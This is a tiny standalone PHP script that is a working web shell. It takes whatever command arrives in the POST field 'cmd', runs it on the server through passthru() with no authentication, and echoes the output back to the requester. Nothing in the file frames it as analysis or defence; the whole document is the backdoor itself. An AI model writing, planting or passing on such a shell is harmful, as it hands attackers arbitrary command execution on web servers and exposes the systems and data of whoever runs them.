<?php
function myshellexec($cmd)
{
	passthru($cmd); 
	$result = @ob_get_contents(); 
	@ob_clean(); 
    return $result;
}

$cmdline = $_POST['cmd'];
$ret = myshellexec($cmdline);
echo $ret;
?>